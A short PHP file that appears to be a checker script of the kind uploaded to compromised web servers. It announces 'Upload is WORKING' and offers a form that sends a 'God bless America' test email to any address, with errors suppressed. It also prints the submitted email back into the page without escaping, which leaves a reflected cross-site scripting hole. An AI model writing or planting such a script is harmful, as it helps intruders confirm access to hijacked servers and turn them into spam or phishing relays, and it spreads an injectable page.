<?php
error_reporting(0);

?>
<head>
<style>
body {
background-color:#FFFF00;
font-size:16px;
font-family:monospace;
margin:0;
padding:0;
text-align: center;
-ms-text-size-adjust: 100%;
-webkit-text-size-adjust: 100%;
}
</style></head><body>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input type="submit" value="Send test >>">
</form>
<br></body>
<?php
if (!empty($_POST['email'])){
	$xx = rand();
	@mail($_POST['email'],"God bless America - ".$xx,"God bless America !");
	print "<b>send an report to [".$_POST['email']."] - $xx</b>"; 
}
?>